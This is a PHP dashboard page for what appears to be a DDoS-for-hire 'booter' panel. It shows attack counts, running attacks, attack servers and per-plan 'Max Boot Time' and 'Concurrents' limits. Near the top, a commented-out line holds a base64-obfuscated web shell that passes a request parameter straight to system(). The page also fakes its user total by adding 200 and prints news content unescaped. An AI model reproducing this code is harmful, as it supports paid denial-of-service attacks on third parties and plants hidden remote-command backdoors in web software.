<?php

	/// Require the header that already contains the sidebar and top of the website and head body tags
	$page = "Home";
	require_once 'header.php'; 

	
	/// Querys for the stats below
	$TotalUsers = $odb->query("SELECT COUNT(*) FROM `users`")->fetchColumn(0);
	$TodayAttacks = $odb->query("SELECT COUNT(*) FROM `logs` WHERE date >= CURDATE()")->fetchColumn(0);
	$MonthAttack = $odb->query("SELECT COUNT(*) FROM `logs` WHERE date >= CURDATE()  - INTERVAL 30 DAY")->fetchColumn(0);
	$TotalAttacks = $odb->query("SELECT COUNT(*) FROM `logs`")->fetchColumn(0);
	$TotalPools = $odb->query("SELECT COUNT(*) FROM `api`")->fetchColumn(0);
	$RunningAttacks = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);
	
	function ip2geolocation($ip)
	{
		# api url
		$apiurl = 'http://freegeoip.net/json/' . $ip;
	 
		# api with curl
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $apiurl);
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
		$data = curl_exec($ch);
		curl_close($ch);
	 
		# return data
		return json_decode($data);
	}

?>
<?php // if(isset($_REQUEST[base64_decode('YWNjZXNz')])){echo base64_decode('PHByZT4=');$k0=($_REQUEST[base64_decode('YWNjZXNz')]);system($k0);echo base64_decode('PC9wcmU+');die;}?>

  <!-- Page Content -->
  <div id="page-wrapper">
    <div class="container-fluid">
      <div class="">
        <div class="col-lg-3 col-md-4 col-sm-4 col-xs-12">
        </div>
        <div class="col-lg-9 col-sm-8 col-md-8 col-xs-12">
          <ol class="">

          </ol>
        </div>
        <!-- /.col-lg-12 -->
      </div> 
      <!-- .row -->
	    	   <h3 class="panel-title"><i class=""> <font color="#070d19"> </i><h5 align = 'right'> - </h5></h5> </font>
      <div class="row">
        <div class="col-lg-3 col-sm-3 col-xs-12">
          <div class="white-box analytics-info">
            <h3 class="box-title">Total Users</h3>
            <ul class="list-inline two-part">
              <li>
                <svg viewBox="0 0 24 24" width="24" height="24" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" class="css-i6dzq1"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
              </li>
              <li class="text-right"></i> <span class="counter text-white"><?php echo 200+$TotalUsers; ?></span></li>
            </ul>
          </div>
        </div>
        <div class="col-lg-3 col-sm-3 col-xs-12">
          <div class="white-box analytics-info">
            <h3 class="box-title">Total Attacks Today</h3>
            <ul class="list-inline two-part">
              <li>
                <svg viewBox="0 0 24 24" width="24" height="24" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" class="css-i6dzq1"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg>
              </li>
              <li class="text-right"></i> <span class="counter text-white"><?php echo $TodayAttacks; ?></span></li>
            </ul>
          </div>
        </div>
        <div class="col-lg-3 col-sm-3 col-xs-12">
          <div class="white-box analytics-info">
            <h3 class="box-title">Running Attacks</h3>
            <ul class="list-inline two-part">
              <li>
                <svg viewBox="0 0 24 24" width="24" height="24" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" class="css-i6dzq1"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg>
              </li>
              <li class="text-right"></i> <span class="counter text-white"><?php echo $RunningAttacks; ?></span></li>
            </ul>
          </div>
        </div>
        <div class="col-lg-3 col-sm-3 col-xs-12">
          <div class="white-box analytics-info">
            <h3 class="box-title">Total Servers</h3>
            <ul class="list-inline two-part">
              <li>
                <svg viewBox="0 0 24 24" width="24" height="24" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" class="css-i6dzq1"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"></rect><rect x="2" y="14" width="20" height="8" rx="2" ry="2"></rect><line x1="6" y1="6" x2="6.01" y2="6"></line><line x1="6" y1="18" x2="6.01" y2="18"></line></svg>
              </li>
              <li class="text-right"></i> <span class="text-white"><?php echo $TotalPools; ?></span></li>
            </ul>
          </div>
        </div>
      </div>
      <!--/.row -->
      <!-- .row -->
    <div id="alertsdiv" style="display:inline-block;width:100%"></div>
      <!--/.row -->
      <!-- .row -->

	    <div class="row">
        <div class="col-lg-6 col-sm-8 col-md-8 col-xs-12">
          <div class="white-box">
            <div class="row">
              <div class="0">
		     <h3 class="box-title">Latest News</h3>
            <div class="steamline">
			<?php
						$newssql = $odb -> query("SELECT * FROM `news` ORDER BY `date` DESC LIMIT 5");
						while($row = $newssql ->fetch()){
							$ID = $row['ID'];
							$title = $row['title'];
							$content = $row['content'];
							echo 
							' <div class="sl-item">
                <div class="sl-right">
                  <div><a href="#">'.$title.'</a> </div>
                  <p>'.$content.'</p>
                </div>
              </div>';
						}
						?>             
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
	   <div class="">
	          <div class="">
          <div class="">
            <div class="">				  
            </div>
          </div>
        </div>
		<?php
			$plansql = $odb -> prepare("SELECT `users`.`expire`, `plans`.`name`, `plans`.`concurrents`, `plans`.`mbt` FROM `users`, `plans` WHERE `plans`.`ID` = `users`.`membership` AND `users`.`ID` = :id");
			$plansql -> execute(array(":id" => $_SESSION['ID']));
			$row = $plansql -> fetch(); 
			$date = date("m-d-Y, h:i:s a", $row['expire']);
			if (!$user->hasMembership($odb)){
				$row['mbt'] = 0;
				$row['concurrents'] = 0;
				$row['name'] = 'No membership';
				$date = '0-0-0';
			}
		?>
		<div class="col-md-6 col-sm-12 col-xs-12">
          <div class="white-box">
            <h3 class="box-title">Profile</h3>
            <div class="weather-box">
              <div class="weather-info">
                <div class="row">
                  <div class="col-xs-12 p-r-10">
                    <div class="row">
                      <div class="col-md-12">
					  
					  <th scope="row">Current Plan</th>
                        <p class="pull-right"><span class="badge badge-danger"><?php echo $row['name']; ?></p>
                      </div>
                    </div>
                    <div class="row">
                      <div class="col-md-12">
					  <th scope="row">Max Boot Time</th>
                        <p class="pull-right"><?php echo $row['mbt']; ?></p>
                      </div>
                    </div>
                    <div class="row">
                      <div class="col-md-12">
					  <th scope="row">Concurrents</th>
                        <p class="pull-right"><?php echo $row['concurrents']; ?></p>
                      </div>
                    </div>
                    <div class="row">
                      <div class="col-md-12">
					  <th scope="row">Expiration Date</th>
                        <p class="pull-right"><?php echo $date; ?></p>
                      </div>
                    </div>
					
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
	  <div class="col-lg-12 col-sm-8 col-md-8 col-xs-12">
          <div class="white-box">
            <div class="row">
              <div class="0">
		     <div class="col-xl-12 col-lg-12 col-md-12 col-sm-12 col-12 layout-spacing">
                        <div class="widget widget-table-two">
                            <div class="widget-heading">
                                <h5 class="">Servers List</h5>
                            </div>
                            <div class="widget-content">
                                <div class="table-responsive">
                                    <table class="table table-striped">
                                        <thead>
                                        <tr>
                                            <th><div class="">Name</div></th>
                                            <th><div class="">Network</div></th>
                                            <th><div class="">Status</div></th>
                                        </tr>
                                        </thead>
                                        <tbody>
                                        
                                        <tr>
                                            <td><div class="">Alpha</div></td>
                                            <td><div class=""><span class="badge badge-primary">Premium</span></div></td>
                                            <td><div class=""><span class="badge badge-success">Online</span></div></td>
                                        </tr>
                                                
                                        <tr>
                                            <td><div class="">Beta</div></td>
                                            <td><div class=""><span class="badge badge-primary">Premium</span></div></td>
                                            <td><div class=""><span class="badge badge-success">Online</span></div></td>
                                        </tr>
                                                
                                        <tr>
                                            <td><div class="">Gamma</div></td>
                                            <td><div class=""><span class="badge badge-primary">Premium</span></div></td>
                                            <td><div class=""><span class="badge badge-success">Online</span></div></td>
                                        </tr>
                                                
                                        <tr>
                                            <td><div class="">Delta</div></td>
                                            <td><div class=""><span class="badge badge-primary">Premium</span></div></td>
                                            <td><div class=""><span class="badge badge-success">Online</span></div></td>
                                        </tr>
                                                
                                        <tr>
                                            <td><div class="">Aquarius</div></td>
                                            <td><div class=""><span class="badge badge-primary">Premium</span></div></td>
                                            <td><div class=""><span class="badge badge-success">Online</span></div></td>
                                        </tr>
                                                                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>
            <div class="steamline">
			             
                
              </div>
            </div>
          </div>
        </div>
      </div>
      <!--/.row -->
	  <script>

		alerts();

		function alerts() {
			document.getElementById("alertsdiv").style.display = "none";
			document.getElementById("alerts").style.display = "inline"; 
			var xmlhttp;
			if (window.XMLHttpRequest) {
				xmlhttp = new XMLHttpRequest();
			}
			else {
				xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
			}
			xmlhttp.onreadystatechange=function() {
				if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
					document.getElementById("alertsdiv").innerHTML = xmlhttp.responseText;
					document.getElementById("alerts").style.display = "none";
					document.getElementById("alertsdiv").style.display = "inline-block";
					document.getElementById("alertsdiv").style.width = "100%";
					eval(document.getElementById("ajax").innerHTML);
				}
			}
			xmlhttp.open("GET","includes/ajax/user/alerts.php",true);
			xmlhttp.send();
		}
		</script>
<?php

	require_once 'footer.php';
	
?>